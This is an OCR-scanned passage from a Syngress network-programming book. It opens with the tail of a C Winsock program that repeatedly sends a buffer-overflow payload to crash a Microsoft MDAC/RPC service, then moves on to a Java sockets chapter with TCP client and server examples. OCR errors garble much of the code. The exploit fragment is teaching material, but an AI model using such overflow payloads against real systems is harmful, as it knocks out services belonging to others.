•\xe6\xd4\x95\xcS\xf0\xf0\xfe\xdb\xf4\xf8\xf0\xfl\xc5\xfc\xe5\xf0\x95,, 
•\xd2\x£9\xfa\x£7\xf4\x£9\xd4\xf9\xf9\xfa\x£6\x95\xc2\xe7\xfc\xel\x£0" 
•\xd3\x£c\xf9\xf0\x95\xc7\x£0\x£4\xfl\xd3\x£c\x£9\x£0\x95\xe6\x£9\x£0" 
•\x£0\xe5\x95\xdO\xed\x£c\xel\xc5\xe7\xfa\x£S\x£0\xe6\xe6\x95\xd6\x£9" 
•\xfa\xe6\xf0\xdd\xf4\xfb\xfl\xf9\xf0\x95\xc2\xc6\xda\xd6\xde\xa6\xa7" 
•\x95\xc2\xc6\xd4\xc6\xel\xf4\xe7\xel\xe0\xe5\x95\xe6\xfa\xf6\xfe\xf0" 
•\xel\x95\xf6\xf9\x£a\xe6\x£0\xe6\xfa\xf6\x£e\x£0\xel\x95\x£6\xfa\x£b" 
"\xfb\xf0\xf6\xel\x95\xe6\xf0\xfb\xfl\x95\xe7\xf0\xf6\xe3\x9S\x£6\xf8" 
•\xfl\xbb\xf0\xed\xf0\x95\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
•\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0d\x0a\x0d\x0a" 
"Host: localhost\r\n\r\n"; 
printf("Begining attack. 
for tint x = 0; x < 9; 
An-); 
•+} 
www.syngress.com 

176 
Chapter 4 • Windows Sockets (Winsock) 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
for(int count = Qj count < 5; count ++) 
{ 
printf("port: %d ", port[x]); 
if{ is_up(targetip, port[xj) ) 
{ 
printf (lhis up. \n"}; 
SleepOOOO); 
printf ("ATTACK \\\ \n" ) ; 
) 
else 
output = send_exploit{targetip, port[x], send); 
printf("Exploit sent \n"J; 
if ( is_string_in("server: microsoft"„ output) && 
is_string_in("remote procedure" H output} '*.!.< 
is_string_in("failed", output) 
{ 
printf("Taken Down! \ n " ) ; 
} 
else 
• : 
printf ("still up. \n") ; 
count = 5; 
printf (lhis down. \n") r 
J* 
Analysis 
Lines 20 through 85 contain the exploit code. The large portion of this string 
contains a large series of hex characters, which should overflow the buffer and 
cause the MDAC service to crash. 
Lines 90 through 119 repeat sending the exploit a number of times and check 
to see if the service crashed after each attempt. 
www.syngress.com 

Chapter 5 
Java Sockets 
Solutions in this Chapter: 
• 
TCP Clients 
• 
TCP Servers 
• 
UDP Clients and Servers 
Related Chapters: Chapter 3, Chapter 4 
1 ttfl 
IZI Summary 
El Solutions Fast Track 
IZI Frequently Asked Questions 
177 
«1

178 
Chapter 5 • Java Sockets 
Introduction 
Java™ Sockets is a programming interface designed to enable applications written in the 
Java programming language to communicate using the Transmission Control Protocol 
(TCP) /Internet Protocol (IP) suite of protocols.The Java Sockets application-program-
ming interface (API) provides a simple, easy-to-use set of classes that abstracts a majority 
of the complexity inherent in networking programming. These classes make up the 
jam,net package and are part of the Java! standard. 
The Java, net package includes support for TCP and User Datagram Protocol (UDP) 
client and server sockets. It also supports IP network address and Domain Name System 
(DNS) resolution to include various other network-related usages. 
This chapter looks at TCP and UDP client and server socket programming using 
the Java.net classes. We also take a brief look at IP address and hostname resolution and 
multithreaded handling ofTCP client connections. 
NOTE 
All of the example source code in this chapter was written and compiled using 
the Java 2 v1.4.1 standard edition Software Development Kit (SDK) on the 
Microsoft Windows2000 platform. 
An Overview of TCP/IP 
The TCP/IP suite of protocols comprises a number of network communications proto-
cols.The most commonly used protocols for application-level communication are TCP 
and UDPThe TCP protocol provides reliable, connection-oriented functionality with 
support for connection multiplexing using ports.The remote host that data is sent to is 
guaranteed to properly receive the data when theTCP protocol is employed.TCP is 
reliable but somewhat slow due to the overhead needed to implement complex error-
checking and flow-control mechanisms. 
The UDP protocol provides unreliable datagram delivery functionality with support 
for connection multiplexing using ports. Data sent using the UDP protocol may arrive 
modified, out of order, in duplicate, or not at all. The UDP protocol is very fast but is 
susceptible to reliability issues. UDP is better suited for local network data transfer where 
packet loss or modification is less likely to occur. An IPv4 address is a 4-byte unsigned 
value that uniquely identifies the source and/or destination host of IP datagrams. Most 
hosts have one IP address but they can have more. 
A 2-byte unsigned value exists that, when combined with the IP address, uniquely 
identifies a communication "endpoint" on any given host. Hosts can have 2A16-1 
unique endpoints per IP address in use. The 2A16-1 value used in conjunction with the 
IP address is known as a "port." Every TCP segment or UDP datagram sent or received 
includes source and destination IP address fields and source and destination port fields. 

Java Sockets • Chapter 5 
179 
A TCP or UDP client communicates from a source IP address and a source port to 
a remote destination IP address and destination port.The source port is typically chosen 
at random in the range of > 1024, 65535. Ports below 1024 are typically reserved for 
privileged services. Some ports have been allocated by standards bodies and should not 
be used for other services. Examples include Hypertext Transfer Protocol (HTTP) on 
TCP/80, Simple Mail Transfer Protocol (SMTP) on TCP/25, and DNS on UDP/53. 
TCP Clients 
TCP client socket programming is simple using thejava.net package. A single class 
(Socket) is used to create and manage the details of new TCP connections. Data is trans-
ferred to and from the socket using the standard InpiilStrcam and OutpittSlream classes 
located in the Java.h package. 
The Socket class provides several constructors and methods useful for establishment, 
control, and termination ofTCP connections.The constructors are used to define and 
establish new connections. The remaining methods are used to send and receive data, 
retrieve information on established connections, fine-tune various aspects of data 
transfer, determine connection state, and for connection termination. 
Of these constructors and methods, only a few are required to implement basic TCP 
client socket functionality (see Example 5.1). 
Example 5.1 TCP Client Socket (TCPCIientl Java) 
1 ." 
2 
* TCPCIientl.Java 
3 * 
4 
* TCP client socket program to connect, request 
5 
* and receive data using TCP and HTTP 1.0 
6 
* protocols. 
7 * 
8 
* Usage; 
9 < 
10 
* Java TCPCIientl <target_ip> <target_port> <resource> 
11 * 
1 2 • 
13 *i 
14 import Java. io. * ; 
15 
import jsva.net.*j 
16 
17 public class TCPCIientl 
18 [ 
1 9 
public static void main(String!1 args) 
20 
{ 
21 
InputStream 
is 
= null; 
22 
OutputStreajm os 
= null; 
23 
Socket 
sock = null; 
24 
String 
addr = null; 
25 
String 
res 
= null; 
26 
String 
send = null ; 
27 
String 
tmp 
= null; 

ava Sockets 
byte[J 
recv • new byte[4096); 
int 
port = 0; 
int 
len 
= 0; 
if(args.length J = 3) 
( 
System.err.println(*usage: Java TCPClientl" 
+ 
" <target_ip> <target_port>* 
" <resource>.•); 
Systerr^err .printlnf'Example: java TCPClientl" 
+ 
*127.0.0.1 80 / • ) ; 
System,exit(1) ; 
addr = args[0]; 
tmp 
= args[1]; 
res = args[2] ; 
try 
{ 
// convert port value to integer 
port = Integer.parseInt ftmp); 
// connect to IP address and port 
sock • new Sockettaddr, port); 
// get connection input & output streams 
is = sock.getinputStrearn (J; 
os = sock.getOutputStream(l ; 
// no exception thrown, connection established 
send = "GET • + res + n HTTP/1+0\r\n\r\nTj 
// send HTTP request 
os.write(send,getBytes{}J; 
// read response 
len = is.read(recv); 
// close Connection 
sock.close(); 
// print results 
if(len > 0) 
{ 
// convert recv'd bytes to string.. 
trnp = new String (recv) ; 
// display via stdout 
System.out,println(tmp }; 

Java Sockets • Chapter 5 
181 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
95 > 
} 
c a t c h 
< 
] 
catch 
< 
) 
! 
) 
(Number Format Except ion 
rife) 
// non-numeric port value? 
System.err.println("NumberFormatException:• 
+ nfe.getMessage()) 
(IOException 
ioe} 
// connection failed? 
System.err.printIn("IOException:" 
+ ioe.getMessage()) 
Is rut _ Compilation 
C:\> j2sdkl .4. l_02\bin\javac.exe TCPClientl oava 
C:\> dir 
TCPClientl.class 
• 
• 
• . 
<: 
I- 
I 
• 
• - Example Execution 
C:\> j2sdkl.4.l_02\bin\java.exe TCPClientl 
usage: Java TCPClientl <target_ip> <:target_port:> <re£ource> 
Example: Java TCPClientl 137.0.0,1 80 / 
C:\> j2sdkl.4.l_02\bin\java.exe TCPClientl 121.0.0.1 90 / 
HTTP/1.0 200 OK 
Server: thttpd/2.23betal 26may2002 
Content-Type: text/html; charset=iso-8859-l 
Date: Mon, 26 May 2003 0S:1S:51 GMT 
Last-Modified: Thu, 08 May 2003 19:30:33 GM 
Ac cep t- Ranges: bytes 
Connection: close 
Content-Length: 339 
In Example 5.1, a TCP client socket is created and connected to an HTTP server 
on port 80, an HTTP request is sent, and the response is read and then printed to stan-
dard out {stdout).This example is useful because it shows the simplicity with which TCP 
connections are established and used with the Socket class. 

182 
Chapter 5 • Java Sockets 
Analysis 
• 
At line 32, command-line arguments are checked and validated. 
• 
At line 51, the Integer parselntQ method is used to convert the port value sup-
plied on the command line to an integer primitive-type suitable for the Socket 
class constructor. 
• 
At line 54, a new Socket instance is created using the Socket constructor and 
the IP address and port supplied on the command line. The TCP connection is 
established during this operation. If an error occurs, such as inability to estab-
lish the desired connection, an lOExceplion instance is thrown. 
• 
At line 57, the JnputStream instance that data is read from is retrieved from the 
Socket instance using the gctltiptitStreamQ method. 
• 
At line 58, the OtttputStream instance that data is written from is retrieved from 
the Socket instance using the getOutputStreamQ method, 
• 
At line 61, the HTTP 1.0 GETrequest is formatted and stored in the string 
variable send. 
• 
At line 64, the string variable send is converted to a byte array using the String 
class geiBytesQ method. The value of this byte array is sent to the Web server 
using the OutputStream writcQ method. 
• 
At line 67, the InputStream rcadQ method is used to read up to 4096 bytes into 
the ivti' byte array The length of data read from the Web server is stored in the 
kn variable. 
• 
At line 70, the connected socket is closed, which results in termination of the 
TCP connection. 
• 
At line 76, if the value of leti returned from the IuputStream rcadQ method is 
greater than zero, the recv byte array is converted to a String object. 
• 
At line 79, the contents of the recv byte array are printed to stdout. 
• 
At line 82, a try-catch handler for the NumbcrFormatExccption class is declared. 
This exception is thrown if the value supplied for the port on the command 
line cannot be converted to an integer value by the Integer class construcror at 
line 51. 
• 
At line 88, a try-catch handler for the IOException class is declared.This excep-
tion is thrown if an error occurs during establishment of a TCP connection, 
transmission of data, or termination of a TCP connection. Unfortunately, the 
IOException class does not give reliable, granular error information such as an 
error code for individual error conditions. Instead, the getMessageQ method may 
be used to obtain a human readable value such as "Connect failed." 

Java Sockets • Chapter 5 
183 
IP Addresses and Hostname Resolution 
Sometimes it is useful to convert IP addresses that are in string "dot" notation to host-
names, and/or hostnames to string "dot" notation. It is also useful to collect information 
about the endpoints that an existingTCP or UDP socket is bound or connected to.The 
representation and translation of an IP address in string "dot" notation, hostname, and fully 
qualified domain name (FQDN) is handled by the jdw.net packages InctAddrcss class. 
The InctAddrcss class may be used to represent an IP address in string "dot" notation 
or to represent a hostname. In addition, the InctAddrcss class provides class methods for 
resolving IP addresses to hostnames and vice versa. 
The Socket class provides two methods—getLocalAddress() and gctlnetAddressQ—that 
return InciAd'dress instances that represent the IP addresses of the local host and remote 
host that a Socket instance is connected to. The Socket class also provides the 
getLocalSoebetAddressQ and getRemoteSocketAddressQ methods that return IuetSocketAddress 
instances that represent the complete local and remote endpoints including local and 
remote IP addresses and local and remote ports. 
The Socket class includes hostname resolution support. An IP address in string "dot" 
notation or hostname is passed to the Socket class constructor and resolved. 
Example 5.2 illustrates how to convert a String object containing either an IP 
address in string "dot" notation or a hostname to an InctAddrcss instance. Note that the 
hostname "CHIAPAS" is the hostname of the authors system.This value may be any 
valid hostname including the FQDN of a remote system such as unt'W.insidiae.org. For 
purposes of this exercise, assume that 10.0.1.56 is CHIAPAS' IP address. 
• j ^ ^ Example 5.2 IP Address or Hostname to InetAddress 
^ ^ ^ M 
I 
InetAddress inetaddrl - null ; 
2 
InetAddress inetaddr2 = null; 
3 
InetAddress inetaddrJ = null; 
4 
String 
addrl 
- "1.92 .16B . 1.101" ; 
5 
String 
addr2 
- "CHIAPAS"; 
6 
String 
addr3 
= "www.insidiae,org"; 
7 
8 
cry 
9 
t 
I 0 
inetaddrl = InetAddressTgetByName(addrl) 
II 
inetaddr2 = InetAddress.getByName(addr2) 
1 2 
inetaddr3 = InetAddress-getByName(addr3) 
13 
} 
14 
catch (UnknownHostException uhe) 
15 
{ 
1 6 
System.err.printInpUnknownHostException: 
H 
17 
+ uhe.getMessagef)); 
18 
> 
19 
20 
System, out. printlnl "INETADDR1: * t inetaddrl); 
21 
System.out.print In("INETADDR2: " + inetaddr2); 
22 
System.out.printlnl"IWETADQR3: " + inetaddr3); 

184 
Chapter 5 • Java Sockets 
">«•» Example Execution 
•HUM 
I K f E T f l D D R ] _ : 
/192. 168.1.101 
IKJETADDR2: CHIAPAS/10.0.1.56 
1NETADDK3: w w w . i n s i d i a e . o r g / 6 8 . 1 6 5 . l B 0 . 1 1 8 
Analysis 
• 
At lines 1 through 3, InetAddress references are declared. 
• 
At lines 4 through 6, the IP address and hostnames to resolve are declared. 
• 
At lines 10 through 12, the IP address and hostnames are resolved using the 
InetAddress getByNa i/iefymethod. The get By Niimfflmethod returns InetAddress 
instances that represent the resolved IP address and hostnames. 
• 
At line 14, a try-catch exception handler is declared to handle 
I hiiiiiownHostException exceptions.This exception is thrown by the InetAddress 
gctByNatucQ method if the supplied argument cannot be resolved. 
• 
At lines 20 through 22, the InetAddress instances are printed to stdont.The 
toStringO method implementation of the InetAddress class prints the hostname 
followed by a / character followed by the IP address of the represented value. If 
no hostname is known, as in the case of IP address 192.168.1.101 in Example 
5.2, no hostname is printed. 
Example 5.3 shows how to retrieve the local and remote IP addresses used by a 
connected Socket instance. This type of functionality may prove to be extraordinarily 
useful when developing TCP servers that permit anonymous connections that you want 
to log or connect back to in some fashion. 
Example 5,3 Retrieve IP Address Information from Active TCP Connection 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
InetAddress inetaddrl = null; 
InetAddress inetaddr2 = null; 
Socket 
try 
t 
) 
catch 
( 
! 
sock 
- null ; 
sock = new Socket("127.0.0.1" , B0); 
inetaddrl = sock.getL-ocalAddress(); 
inetaddr2 = sock.getinetAddress (); 
System.out,printin(inetaddrl); 
System.out.println(inetaddr2); 
(Un knownH os t Exc ep t i on uhe) 
System.err.println("UnknownHostException: » 
+ uhe.getMessagen ) 

Java Sockets * Chapter 5 
185 
20 
catch (lOException ioe} 
21 
{ 
22 
SyS tem. e r r T p r i n t 111 (1hlOExcept ion * + ioe . getMessaqe () ) ; 
23 
) 
Example 5.3 produces output like the following when run against a local 
TCPServcrt example program running on port HO (see Example 5.5). It is important to 
note that if the client connected to a remote server, the second IP address displayed in 
the following example would be different than the first, local address. 
mm—m Example Execution 
C:\> TCPServerl SO 
*** listening on port 80 
(other shell) 
C:\> Java Example3.java 127.0,0,1 SO I 
nil. 
o.o.i 
/ 1 2 7 . 0 . 0 . 1 
Analysis 
• 
At line 7, a TCP client socket is connected to IP address 127.0.0.1 on port 80. 
• 
At line 9, the IP address for the local endpoint of the connection is retrieved as 
an InetAJdress instance. In this example, the connection is made both to and 
from the locaihost address: therefore, both the local and remote IP addresses for 
the connection is 127.0.0.1. Note, however, that the local and remote port 
values will differ. 
• 
At line 10, the IP address for the remote endpoint of the connection is 
retrieved as an luetAddrcss instance. In this example, the remote IP address is 
127.0.0.1. 
• 
At lines 12 through 13, the local and remote IP addresses as represented by 
hietAddress instances are printed to stdottt. 
• 
At line 15, a try-catch exception handler for the UnknoumHostException excep-
tion is declared, which handles exceptions thrown by the Socket class con-
structor if it cannot resolve the hostname argument passed to it. 
• 
At line 20, a try-catch handler for the lOException class is declared.This excep-
tion is thrown if an error occurs during establishment of a TCP connection, 
transmission of data, or termination of a TCP connection. 
The resolution of IP addresses in string "dot" notation occurs immediately in a 
"non-blocking" operation.The resolution of hostnanies such as CHIAPAS (see Example 
5.2) is a "blocking" operation that performs using the DNS resolution protocol and may 
take several seconds to complete. 

186 
Chapter 5 • Java Sockets 
Text-Based Input/Output: 
The LineNumberReader Class 
When working with text-based protocols such as HTTP, Post Office Protocol (POP), 
Internet Message Access Protocol (IMAP), or File Transfer Protocol (FTP), it is useful to 
treat received data as lines of text rather an as a byte array. The java.io package provides 
the LineNumberReader class, which can be used to easily read data as lines of text from a 
connected Socket. 
To use an instance of the LineNumberReader class to read data line by line, perform 
the following: 
1. Retrieve the InputStream instance from a connected Socket instance. 
2. 
Use the Input Stream instance to create an instance of the InputStreamReader 
class. 
3. 
Use the InputStreamReader instance to create an instance of the 
LineNumberReader class. 
Once an instance of the LineNumberReader class has been created, data can be read 
one line at a time. 
Example 5.4 expands upon Example 5.3 by reading and displaying the response 
from the remote Web server line-by-line. This is an extremely simple but equally useful 
example that can be used to write banner-grabbing applications, vulnerability-assessment 
scanners, proxies, and Web exploits. 
j " " t " " Example 5.4 TCP Client That Uses the LineNumberReader Class {TCPCIient2.java) 
• 
2 
* TCPClierit2 . Java 
3 
* 
4 
* TCP client socket program to connect, request 
5 
* and receive data using TCP and HTTP 1.0 
6 
* protocols. Read and display response line by 
7 
* line using LineNumberReader class. 
8 * 
9 
* Usage: 
10 * 
11 
* Java TCPClient.2 <target_ip> <target_port> <resource> 
12 
* 
13 
-
14 
v 
15 import java+io+* ; 
16 import java.net.*; 
17 
18 public class TCPClient2 
19 ( 
20 
public static void main(String[] args) 
21 
t 
22 
23 
InputStreamReaderisr = null r 

Java Sockets • Chapters 
187 
24 
25 
25 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
45 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
Lin eNumber Reader 
InputStream 
OutputStream 
Socket 
:;:.i ing 
String 
StI 1 Jirj 
String 
byte[] 
i nt 
int 
lnr 
OS 
sock 
addr 
LL:t; 
send 
'_:;.p 
recv 
port 
: • : 
= 
= 
= 
= 
= 
= 
= 
= 
= 
= 
null; 
is 
- nil] 1 ; 
null; 
null; 
null; 
null; 
null ; 
null; 
new byte[4096) 
•i; 
0; 
if(args.length 1= 3) 
{ 
System.err. print In pusage: Java TCPClient2 " 
+-
,A<target_ip> 
<target_port> 
Vresource> . ") ; 
System.err. print In (w Example: Java TCPClient2 * 
•+ 
"127.0.0.1 80 / " ) ; 
System.exit[11 ; 
} 
addr = args[0]; 
amp = args[l]; 
res = args[2]; 
• : 
// convert port value to integer 
port = integer.parseint(tmp); 
// connect to IP address and port 
sock = new Socket(addr, port)? 
// get connection output stream 
os = sock.getOutputStream(); 
// format HTTP request 
send • *GET * + res + • HTTP/1.0\r\n\r\n*; 
// send HTTP request 
os.write(send.getBytes ()); 
// get connection input stream 
is = sock.getlnputStream (}; 
// convert to LineNumberReader 
isr = new InputStreamReader(is ); 
lnr = new LineNumberReader (isr); 
// read k display response line by line 
X = 0; 

188 
Chapter 5 • Java Sockets 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
95 
96 
97 
98 ) 
99 
while((tmp = Inr.readLine() ) 1= null) 
{ 
System.out-println[x + ") * +• tmp) ; 
++x; 
} 
// close connection 
sock.close() ; 
) 
catch (Number Format: Except ion nfe) 
( 
// non-numeric port value? 
System,err,printIn(nNumberFormatException; 
w 
+ nfergetMessage()) 
} 
catch (IQException 
ioe) 
( 
// connection failed? 
System, err .printlnCIOException: * 
t ioe.getMessaget) J 
> 
1 
^ i l l Compilation 
C:\> j2sdkL4.1_02\bin\javac.exe TCPClient2.Java 
C:\> dir 
TCPClient2.class 
:. r r; t g Example Execution 
C:\> j2sdkL4.1_02\bin\java.exe TCPClient2 
usage: 
Java TCPClient2 <target_ip> ^target_port> iresoyrce> 
Example: Java TCFClient2 127.0.0.1 80 / 
C:\> j2sdkl-4.1_02\bin\java.exe TCPClient2 www.insidiae.org 80 / 
0) HTTP/1.0 200 OK 
1) Server: thttpd/2.23betal 26may2002 
2) Content-Type: text/htm1; charset=iso-8359-l 
3) Date: Mon, 26 May 2003 17:02:29 GMT 
4) Last-Modified: Thu, 03 May 2003 19:30:33 GMT 
5) Accept-Ranges: bytes 
6) Connection: close 
7) Content-Length: 339 

Java Sockets • Chapters 
189 
In Example 5.4, a TCP client socket is created, used to connect to an HTTP server 
on port 80, a standard HI "IP GET \ HTTP/1.0 request is sent, the response is read line-
by-line using the LineNumberRcadcr class, and lastly it is printed to stdout or, in this case, 
the Microsoft command line. 
Analysis 
• 
At lines 1 through 56, the same setup is performed as in the TCPGlient 1 
example. Command-line arguments are processed and a Socket object is cre-
ated and connected to the supplied IP address and port. 
• 
At lines 59 through 65, the OutputStream instance for the Socket instance is 
retrieved, the HTTP request is formatted, and the HTTP request is sent to the 
remote host. 
• 
At lines 68 through 72, the IiiptitStrcam instance for the Socket instance is 
retrieved and converted first to an instance of the InputStreantReader class and 
then to an instance of the LineNumberRcadcr class. 
• 
At lines 75 through 80, the LineNumberRcadcr instance is used to read the 
response from the remote server line-by-line. Each line is printed to stdout and 
is preceded by a line number. 
• 
At lines 82 through 98, the same cleanup is performed as in the TCPCliaitl 
example.TheTCP client socket is closed, terminating theTCP connection, 
and the IOException and NumbcrFormatExccption try-catch exception handlers are 
declared. 
So far, we have looked at the creation of a simple TCP client socket program using 
the Socket class. We have analyzed several ways to handle IP address and hostname reso-
lution and looked at how to handle data received from a remote host as lines of text. 
(Note that receiving and outputting data to TCP clients is very similar to the process 
used to gather UDP data and data from different TCP servers.) The next section details 
how to create a TCP server socket that can receive connections from TCP client pro-
grams such as TCPCtientl and TCPCIicnt2. 
TCP Servers 
TCP server-socket programming is almost as simple as client socket programming. A 
single class (ServerSockct) is used to create and manage TCP client socket connections. 
The ServerSockct binds to a port and waits for new TCP client connections. When a new 
TCP client connection is received, an instance of the Socket class is created by the 
ServerSockct instance and used to communicate with the remote client. All of the same 
techniques described in the previous section can be used with this newly created Socket 
instance. 

190 
Chapter 5 • Java Sockets 
. 4 . 
The ServerSocket class provides several constructors and methods usefi.il for binding a 
TCP server socket to a local IP address and port.These constructors are used to define 
the local IP addresses, the local port, and the connection backlog parameters to be used. 
The remaining methods are used to receive newTCP connections, fine-tune various 
aspects of newly created Socket instances, determine the binding state, and for closing of 
the socket. 
Relatively few of the constructors and methods are needed to implement basic TCP 
server-socket functionality (see Example 5.5), In this example, the LineNuniherRcadcr class 
is used to read the TCP client request line-by-line. It is important to note that this TCP 
server is single-threaded and will close or exit upon receiving and sending one string. 
Example 5.5 TCP Server Socket {TCPServerl Java) 
1 
f* 
2 
* TCPServerl.Java 
3 * 
4 
* TCP server socket program to bind, listen for 
5 
* reejuest„ 
print 
request and send response 
6 
* using TCP and HTTP 
1.0 protocols. 
7 
* 
8 
* Usage* 
9 
-
10 
* Java TCPServerl <local_port> 
11 
* 
12 -
13 
v 
14 
15 
import java.io.* ; 
1 6 
i mpoi - iava .nv.\: . - ; 
17 
IS 
public class TCPServerl 
19 ( 
20 
public s t a t i c void main(String[] 
args) 
21 
t 
22 
InputStreamReader isr • null; 
23 
LineNumberReader Inr = null; 
24 
OutputStream 
os 
= null; 
25 
ServerSocket 
serv = null; 
26 
InputStream 
is 
- null; 
27 
Socket 
clnt = null; 
28 
String 
send = null; 
29 
String 
tmp = null; 
30 
int 
port = 0; 
31 
int 
x 
= 0 ; 
32 
33 
if(args.length != 11 
34 
{ 
35 
System.err.printIn("usage: Java * + 
36 
TCPServerl <local_port>"): 
37 
System.err.printIn("Example: Java TCPServerl 80 r); 

Java Sockets • Chapters 
191 
38 
System, exit (11 ; 
39 
} 
40 
41 
tmp = args[Q] ; 
42 
43 
try 
44 
{ 
45 
// convert port value to integer 
46 
port • Integer.parselnt(tmp); 
47 
48 
// initH bind, listen 
49 
serv = new £erver£ocket(port); 
50 
51 
System, out r print In ("**** listening on port " + port) j 
52 
53 
// accept new connection 
54 
clnt = serv.accept(); 
55 
56 
// get input stream 
57 
is 
= clnt.getlnputStream ( 
) ; 
58 
59 
// convert to LineNumberReader 
60 
isr = new inputStreamReader(is }; 
61 
lnr = new LineNumberReader {isr}; 
62 
63 
// read request 
64 
x = 0; 
65 
while({tmp = lnr.readLine()) l= null) 
66 
( 
67 
System.out.println(x + -) - + tmp); 
68 
++X; 
69 
70 
// handle double-newline HTTP request delimiter 
71 
if(tmp,length!) == 0) 
72 
( 
73 
break; 
74 
) 
75 
] 
76 
77 
U get output stream 
78 
OS 
= clnt.getQutputStream{)j 
79 
80 
// send response 
81 
send = "HTTP/1.0 200 OK\r\n\r\nTCPServerli"; 
82 
83 
os.write(send.getBytes()); 
84 
85 
// close client 
86 
clnt.close() ; 
87 
88 
// close server 
89 
serv.close!); 

192 
Chapter 5 • Java Sockets 
90 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104} 
105 
> 
catch 
(NumberFormatException nfe) 
( 
// non-numeric port value? 
System. err .println ("NujmberFormatException: * 
+ nfe.getMessage()) 
) 
catch(IOException ioe) 
t 
// connection failed? 
System .err .print In C1 IOExcept ion: " 
+ ioe.getMessageU ) 
) 
] 
-T^. Compilation 
C:\> j2sdkl.4.l_Q2\bin\javac.exe TCPServerl.Java 
C;\> cUr 
TCPServerl.class 
jgg Example Execution 
C:\> j2sdkl.4.l_02\bin\java.exe TCPServerl 
usage: Java TCPServerl *:local_port:> 
Example: Java TCPServerl 80 
C:\> j2sdkl.4.l_02\bin\java.exe TCPServerl 80 
*** listening on port 60 
In Example 5.5, a TCP server socket is created, bound to the port supplied on the 
command line, and used to accept new TCP client socket connections.The TCP client 
socket instance is used to receive an HTTP 1.0 request and to send an HTTP 1.0 
response. 
Analysis 
At lines 33 through 38, the port argument supplied on the command line is 
processed. 

Java Sockets • Chapters 
193 
• 
At line 46, the port value supplied on the command line is converted from a 
String instance to a primitive integer type using the Integer parselntQ method. 
• 
At line 49, the ServerSocket method is bound and set to listen for new TCP 
connections. Unlike other network programming interfaces such as Berkeley 
Software Distribution (BSD) sockets, the Server Socket class performs the bind 
and listen operations in one step during execution of the ServerSocket con-
structor. 
• 
At line 54, the ServerSocket acceptQ method is called to accept a new TCP client 
connection. This is a blocking method, meaning it will not return until a new 
connection has been received. Once a new connection has been received, the 
acceptQ method returns a Socket object representing the new connection. 
• 
At lines 57 through 61, the client connection lnpiitStreani is retrieved using the 
Socket getInputStream() method.The InpiitStrcant is then converted to a 
LincNinnberReader instance to allow for processing the client request as lines of 
American Standard Code for Information Interchange (ASCII) text. 
• 
At lines 63 through 75, the client request is read line-by-line using the 
LinelSimnberRectder class and printed to stdout, 
• 
At line 78, the client connection OutpttrStream is retrieved using the Socket 
getOutputStrcam(') method. 
• 
At line 81, the HTTP 1.0 response is formatted and stored in the send variable. 
• 
At line 83, the send variable is converted to a byte array using the String 
gelBytesQ instance, and is sent to the client using the OntptitStreant writeQ 
instance. 
• 
At line 86, the TCP client connection is closed using the Socket closeQ instance. 
At this point, no more data can be sent or received using this Socket instance. 
• 
At line 89, the TCP server socket is closed using the ServerSocket closeQ 
instance. At this point, no new client connections may be received using this 
ServerSocket instance. 
• 
At line 91, a try-catch handler for the NninberFormcitException exception is 
declared. This exception handler is called if the port argument supplied on the 
command line is not properly formatted. 
• 
At line 97, a try-catch handler for the lOException exception is declared. This 
exception handler is called if an exception occurs while processing new client 
connections, and can be thrown by either the TCP server socket ServerSocket 
instance or the TCP client Socket instance. 
Using a Web Browser to Connect to TCPServerl 
The server created in Example 5.5 can be used to supply a Web browser with data just 
like any other Web server. It is possible to connect to the TCPServerl program using a 

194 
Chapter 5 • Java Sockets 
standard Web browser (see Figure 5.1).The following output is generated using the 
TCPServerl program when we connect to it using Microsoft Internet Explorer 5.0 for 
Windows: 
SYHGRESS* Java TCPServerl 80 
*** listening on port 60 
0) GET / HTTP/1.1 
1) Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, 
application/vnd.ms-powerpoint, application/msword, */* 
2) Accept-Language: en-us 
3) Accept-Encoding: gzip, deflate 
4) User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0( 
5) Host: 127.0.0.1 
6) Connection: Keep-Alive 
7) 
Figure 5.1 What the Web Browser Displays 
'3titrft:. JY7J.(].Ti.l/ - Mirrosolr, 
Internet txplorerpropotttonadD 
Fie 
Ed* 
view 
Fsv»*es 
Toots 
Help 
*<Ra* - •• - O (3 t3 
§Se*th 
^JFiwrtes 
QfHedia 
$ 
_ ^ j - ^J 
Ad*ess [-£] IWp://lJ7.0.D.I/ 
"31 <*>«> **«*» 
TCPServerl! 
£ j t 
•C Internet 
Handling Multiple Connections 
As previously noted, Example 5.5 illustrates how to receive and process a single T C P 
client connection. Normally, a T C P server implementation must handle multiple new 
connections.There are two basic approaches for handling multiple connections; 
• 
Handle new connections serially, within the same thread as the T C P server 
socket is operating. 
• 
Use separate threads of execution to handle new T C P client connection. 
Handling new TCP client connections serially is simple to implement and has the 
benefit of requiring few resources. However, this model quickly becomes untenable if 
more than a small number of client connections must be processed in a short amount of 
time. 
Handling new T C P client connections in one or more separate threads of execution 
is somewhat more complicated to implement but has the benefit of being both faster 

Java Sockets • Chapters 
195 
and more scalable than serial handling of new connections. One downside to this 
approach is the increased overhead associated with creating new threads to handle new 
client connections. Various designs can be used, depending on the performance and 
resource utilization requirements of an implementation. 
O n e threaded design is to place new client connections in a queue, with each new 
client connection being removed from the queue and processed in a separate thread. 
This approach frees the thread that the T C P server socket operates in to continue to 
accept new client connections. The downside of this approach is that client connections 
may be processed slower than they are being added to the queue, resulting in a quickly 
expanding queue and ultimately in high memory utilization and slow response time. 
Another thread design involves creating a new thread to handle each new client 
connection. This design has the benefit of quickly handling each new connection. The 
downside to this approach is that a large number of threads may be created and 
destroyed rapidly, requiring a lot of context switching and processor time. 
A third approach that attempts to achieve balance between the two previously 
described approaches, is to use a thread pool to process new client connections. In this 
